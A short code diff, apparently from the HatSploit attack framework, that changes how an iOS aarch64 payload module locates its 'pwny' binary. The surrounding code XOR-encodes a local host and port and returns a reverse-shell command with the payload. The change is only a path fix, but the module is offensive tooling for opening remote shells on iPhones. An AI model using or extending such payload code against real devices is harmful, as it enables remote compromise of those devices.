@@ -77,7 +77,7 @@ class HatSploitPayload(Payload, StringTools, TCPClient):
         local_port = self.xor_string(local_port)
 
         self.output_process("Generating payload...")
-        with open('data/pwny/iphoneos/aarch64/pwny', 'rb') as f:
+        with open(self.data_path + 'pwny/iphoneos/aarch64/pwny', 'rb') as f:
             payload = f.read()
 
         return payload, f"reverse '{local_host}' '{local_port}'", HatSploitSession
